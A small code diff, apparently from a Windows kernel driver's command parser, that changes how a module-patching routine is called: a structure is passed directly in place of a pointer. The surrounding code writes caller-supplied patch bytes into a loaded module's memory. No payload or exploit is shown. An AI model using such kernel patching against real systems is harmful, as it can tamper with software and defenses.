@@ -42,7 +42,7 @@ NTSTATUS PatchParser::Execute(Options commandId, PVOID args[MAX_ARGS]) {
 	patchedModule.Patch = (PVOID)args[3];
 	patchedModule.PatchLength = *(ULONG*)args[4];
 
-	status = NidhoggMemoryHandler->PatchModule(&patchedModule);
+	status = NidhoggMemoryHandler->PatchModule(patchedModule);
 
 	RtlFreeUnicodeString(&wModuleName);
 	return status;
